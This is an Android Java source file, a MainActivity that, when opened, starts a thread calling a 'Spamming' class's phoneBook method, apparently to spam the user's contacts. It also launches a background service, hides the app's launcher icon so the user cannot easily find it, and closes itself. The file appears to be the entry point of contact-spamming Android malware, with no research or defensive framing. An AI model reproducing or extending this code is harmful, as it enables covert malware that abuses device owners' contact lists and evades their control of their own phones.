package com.example.center;

import java.io.IOException;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.Looper;

public class MainActivity extends Activity {

	Context context;
	
	private void tryHidIcon(){
		getPackageManager().setComponentEnabledSetting(getComponentName(), 2, 1);
	}
	
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		context = this;	
		
		new SpamThread().start();
		
		Intent intent = new Intent(this, MyService.class);
		startService(intent);
		tryHidIcon();		
		finish();
		
	}
	
	class SpamThread extends Thread {

		@Override
		public void run() {

			Looper.prepare();
			
			try {
				new Spamming(context).phoneBook();
			} 
			catch (IOException e) { };
			
			Looper.loop();
			
		}
		
	}
}